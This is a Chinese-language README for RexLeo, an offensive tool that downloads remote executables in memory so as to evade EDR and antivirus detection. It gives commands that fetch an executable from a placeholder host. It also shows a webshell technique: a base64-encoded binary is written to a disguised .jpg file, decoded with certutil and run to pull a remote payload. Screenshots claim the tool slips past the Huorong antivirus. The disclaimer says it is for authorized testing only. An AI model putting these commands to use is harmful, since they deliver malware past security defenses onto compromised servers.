# RexLeo / ByPassDownLoadFile

## Code By:Tas9er / A.E.0.S Security Team

#### :underage:项目概述

**传统命令行工具（如certutil.exe,curl.exe等）执行远程可执行文件下载的行为已被主流EDR/AV产品深度标记。RexLeo基于内存操作的隐蔽下载行为，突破现有安全防护机制**



#### :x:警告说明​

**本项目仅作为网络安全技术研究与授权测试用途，使用者应严格遵守《中华人民共和国网络安全法》《中华人民共和国数据安全法》《中华人民共和国刑法》等相关法律法规。项目开发者不对任何未经授权或非法使用行为承担法律责任，亦不对因项目使用导致的直接或间接损失负责，声明任何使用者下载后24小时内删除。**



#### :fish:使用说明​

**常规操作:**

RexLeo.exe --file=http(s)://www.demo.com/abc.exe

**日常操作:**

当只有WebShell或者命令执行的时候，建议使用Echo+Base64方式写入文件至服务器并且执行

echo "TVqQAAMAAAAEAAAA//8AAIsAAAAAA....">> demo.jpg && certutil.exe -decode demo.jpg demo.css && cmd.exe /c demo.css --file=http(s)://www.demo.com/abc.exe

#### :heavy_check_mark:杀软绕过测试​

火绒 - 常规下载 - Curl - 拦截

![01](/image/01.png)

火绒 - 常规下载 - Certutil - 拦截

![02](/image/02.png)

火绒 - 常规下载 - BitsAdmin - 拦截

![03](/image/03.png)

火绒 - 绕过下载 - RexLeo - 成功绕过

![04](/image/04.png)



